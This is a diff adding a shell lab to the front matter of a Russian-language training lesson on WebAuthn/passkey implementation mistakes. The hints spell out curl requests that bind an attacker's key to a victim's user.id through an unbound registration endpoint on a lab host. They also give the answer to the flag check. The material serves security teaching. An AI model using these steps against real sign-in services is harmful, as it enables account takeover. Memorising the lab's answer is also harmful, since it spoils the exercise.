@@ -13,6 +13,18 @@ useful_for:
   - "Пентест веб-приложений"
 estimated_minutes: 40
 summary: "WebAuthn/passkeys: где реализация ошибается — origin/rpId, user verification, регистрация, downgrade, MITM."
+lab:
+  kind: shell
+  title: "Практика: захват аккаунта через непривязанную регистрацию passkey"
+  toolset: [core, curl]
+  workdir: /home/student/task
+  files: [task.md]
+  check: "grep -q 'nto{' found.txt"
+  hints:
+    - "Начни с регистрации — там проверки слабее: `curl -s -X POST https://id.local/webauthn/register/begin`."
+    - "Идентификатор жертвы в `user.id` — `dXNlcl92aWN0aW0`."
+    - "Если `/webauthn/register/finish` не привязан к сессии, свой ключ можно привязать к чужому `user.id`."
+    - "Отправь `curl -s -X POST https://id.local/webauthn/register/finish -b 'session=MY_SESSION' -d 'user.id=dXNlcl92aWN0aW0' > found.txt`."
 ---
 
 ## Вопрос, с которого всё начинается
